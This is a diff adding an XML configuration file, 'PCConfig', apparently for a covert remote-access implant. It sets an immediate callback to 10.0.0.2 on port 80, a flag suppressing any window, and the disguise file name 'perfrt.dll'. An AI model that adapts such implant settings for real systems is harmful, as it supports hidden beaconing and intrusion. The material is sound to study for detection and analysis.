@@ -1,0 +1,30 @@
+﻿<?xml version='1.0' encoding='UTF-8' ?>
+<PCConfig>
+  <Version>2.3.0</Version>
+  <Id>0x0000000000000000</Id>
+  <Flags value='0x0000008a'>
+    <PCHEAP_CONFIG_FLAG_CALLBACK_NOW/>
+    <PCHEAP_CONFIG_FLAG_LEVEL3/>
+    <PCHEAP_CONFIG_FLAG_DONT_CREATE_WINDOW/>
+  </Flags>
+  <CallbackAddress>10.0.0.2</CallbackAddress>
+  <CallbackPorts>
+    <CallbackPair>
+      <SrcPort>0</SrcPort>
+      <DstPort>80</DstPort>
+    </CallbackPair>
+  </CallbackPorts>
+  <DriverName/>
+  <ProcessName/>
+  <InfoValue/>
+  <InternalName>perfrt.dll</InternalName>
+  <OriginalFilename>perfrt.dll</OriginalFilename>
+  <ProxyAddress/>
+  <ProxyPort>0</ProxyPort>
+  <ProxyUser/>
+  <ProxyPassword/>
+  <MaxDataPerSend>0</MaxDataPerSend>
+  <WaitTimeAfterFailure>0</WaitTimeAfterFailure>
+  <WaitTimeBetweenSends>0</WaitTimeBetweenSends>
+  <MaximumSendFailures>0</MaximumSendFailures>
+</PCConfig>
